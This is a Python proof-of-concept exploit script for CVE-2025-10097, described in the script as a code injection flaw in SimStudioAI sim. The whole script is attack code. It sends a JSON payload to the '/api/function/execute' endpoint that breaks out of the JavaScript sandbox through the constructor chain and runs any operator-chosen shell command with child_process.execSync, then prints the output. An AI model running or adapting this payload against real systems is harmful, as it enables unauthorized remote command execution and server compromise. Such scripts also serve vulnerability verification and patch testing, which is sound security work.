#!/usr/bin/env python3
import requests
import argparse
import sys

def exploit(target, command="id"):
    url = f"{target}/api/function/execute"
    
    payload = {
        "code": f"const proc = this.constructor.constructor('return process')(); const {{ execSync }} = proc.mainModule.require('child_process'); return execSync('{command}').toString();",
        "timeout": 5000
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        data = response.json()
        
        if data.get("success") and data.get("output", {}).get("result"):
            result = data["output"]["result"]
            print(f"[+] Vulnerability confirmed!")
            print(f"[+] Command output:\n{result}")
            return True
        else:
            print(f"[-] Exploit failed: {data}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-10097 PoC - SimStudioAI sim RCE")
    parser.add_argument("-t", "--target", default="http://localhost:3000", help="Target URL")
    parser.add_argument("-c", "--command", default="id", help="Command to execute")
    args = parser.parse_args()
    
    print(f"[*] CVE-2025-10097 - SimStudioAI sim Code Injection")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")
    print()
    
    if exploit(args.target, args.command):
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
